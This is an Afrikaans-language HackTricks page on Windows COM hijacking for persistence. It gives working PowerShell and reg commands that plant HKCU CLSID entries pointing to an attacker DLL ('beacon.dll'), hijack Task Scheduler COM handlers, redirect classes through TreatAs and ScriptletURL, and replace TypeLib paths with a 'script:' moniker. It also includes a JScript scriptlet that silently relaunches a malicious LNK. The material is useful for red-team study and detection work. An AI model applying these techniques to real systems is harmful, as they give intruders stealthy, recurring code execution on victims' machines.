# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Soek na nie-bestaande COM components

Omdat die waardes van HKCU deur gebruikers gewysig kan word, kan **COM Hijacking** as ’n **persistence mechanism** gebruik word. Met `procmon` is dit maklik om na COM-registers te soek wat nog nie bestaan nie en deur ’n aanvaller geskep kan word. Klassieke filters:

- **RegOpenKey**-bewerkings.
- waar die _Result_ **NAME NOT FOUND** is.
- en die _Path_ met **InprocServer32** eindig.

Nuttige variasies tydens hunting:

- Soek ook na ontbrekende **`LocalServer32`**-sleutels. Sommige COM-klasse is out-of-process servers en sal ’n aanvaller-beheerde EXE in plaas van ’n DLL begin.
- Soek na **`TreatAs`**- en **`ScriptletURL`**-registerbewerkings, benewens `InprocServer32`. Onlangse detection content en malware writeups verwys telkens hierna omdat hulle baie skaarser as normale COM-registrasies is en daarom high-signal is.
- Kopieer die wettige **`ThreadingModel`** vanaf die oorspronklike `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` wanneer ’n registrasie in HKCU gekloon word. Die gebruik van die verkeerde model breek aktivering dikwels en maak die hijack noisy.<sup>[[3]](#references)</sup>
- Op 64-bis-stelsels, ondersoek beide 64-bis- en 32-bis-views (`procmon.exe` teenoor `procmon64.exe`, `HKLM\Software\Classes` en `HKLM\Software\Classes\WOW6432Node`), omdat 32-bis-toepassings ’n ander COM-registrasie kan resolve.

Sodra jy besluit het watter nie-bestaande COM jy wil impersonate, voer die volgende commands uit. _Wees versigtig as jy besluit om ’n COM te impersonate wat elke paar sekondes gelaai word, aangesien dit overkill kan wees._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks gebruik Custom Triggers om COM objects aan te roep, en omdat hulle deur die Task Scheduler uitgevoer word, is dit makliker om te voorspel wanneer hulle geaktiveer gaan word.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Deur die output na te gaan, kan jy byvoorbeeld een kies wat **elke keer wanneer ’n user aanmeld** uitgevoer gaan word.

Wanneer jy nou na die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** sowel as in HKLM en HKCU soek, sal jy gewoonlik vind dat die waarde nie in HKCU bestaan nie.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dan kan jy eenvoudig die HKCU-inskrywing skep, en elke keer wanneer die gebruiker aanmeld, sal jou backdoor uitgevoer word.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` laat toe dat een CLSID deur ’n ander een nageboots word.<sup>[[4]](#references)</sup> Vanuit ’n offensive perspektief beteken dit dat jy die oorspronklike CLSID onaangeraak kan laat, ’n tweede per-user CLSID kan skep wat na `scrobj.dll` wys, en dan die werklike COM-object na die malicious een kan herlei met `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Dit is nuttig wanneer:

- die teikentoepassing reeds ’n stabiele CLSID by logon of wanneer die app begin, instansieer
- jy ’n registry-only redirect wil hê in plaas daarvan om die oorspronklike `InprocServer32` te vervang
- jy ’n plaaslike of afgeleë `.sct` scriptlet deur die `ScriptletURL`-waarde wil uitvoer

Voorbeeld-werksvloei (aangepas uit openbare Atomic Red Team tradecraft en ouer navorsing oor COM registry abuse):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notas:

- `scrobj.dll` lees die `ScriptletURL`-waarde en voer die verwysde `.sct` uit, dus kan jy die payload as ’n plaaslike lêer hou of dit oor HTTP/HTTPS op afstand laai.
- `TreatAs` is besonder nuttig wanneer die oorspronklike COM-registrasie volledig en stabiel in HKLM is, omdat jy slegs ’n klein per-gebruiker-herleiding nodig het in plaas daarvan om die hele boom te weerspieël.
- Vir validering sonder om vir die natuurlike sneller te wag, kan jy die fake ProgID/CLSID handmatig instansieer met `rundll32.exe -sta <ProgID-or-CLSID>` indien die teikenk klas STA-aktivering ondersteun.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definieer COM-koppelvlakke en word via `LoadTypeLib()` gelaai. Wanneer ’n COM-server geïnstansieer word, kan die OS ook die geassosieerde TypeLib laai deur register-sleutels onder `HKCR\TypeLib\{LIBID}` te raadpleeg. As die TypeLib-pad met ’n **moniker** vervang word, byvoorbeeld `script:C:\...\evil.sct`, sal Windows die scriptlet uitvoer wanneer die TypeLib opgelos word – wat ’n stealthy persistence oplewer wat geaktiveer word wanneer algemene komponente gebruik word.

Dit is waargeneem teen die Microsoft Web Browser-control (wat gereeld deur Internet Explorer, apps wat WebBrowser insluit, en selfs `explorer.exe` gelaai word).<sup>[[1]](#references)[[2]](#references)</sup>

### Stappe (PowerShell)

1) Identifiseer die TypeLib (LIBID) wat deur ’n hoëfrekwensie-CLSID gebruik word. Voorbeeld van ’n CLSID wat dikwels deur malware chains misbruik word: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Wys die per-gebruiker TypeLib-pad na ’n plaaslike scriptlet met die `script:` moniker (geen administrateurregte word vereis nie):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Plaas 'n minimale JScript `.sct` wat jou primêre payload herbegin (bv. 'n `.lnk` wat deur die aanvanklike chain gebruik word):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – die opening van IE, ’n toepassing wat die WebBrowser control inbed, of selfs normale Explorer-aktiwiteit sal die TypeLib laai en die scriptlet uitvoer, wat jou chain weer op logon/reboot bewapen.

Skoonmaak
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Aantekeninge
- Jy kan dieselfde logika op ander hoëfrekwensie-COM-komponente toepas; bepaal altyd eers die werklike `LIBID` vanaf `HKCR\CLSID\{CLSID}\TypeLib`.
- Op 64-bis-stelsels kan jy ook die `win64`-subsleutel vir 64-bis-consumers invul.

## Verwysings

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
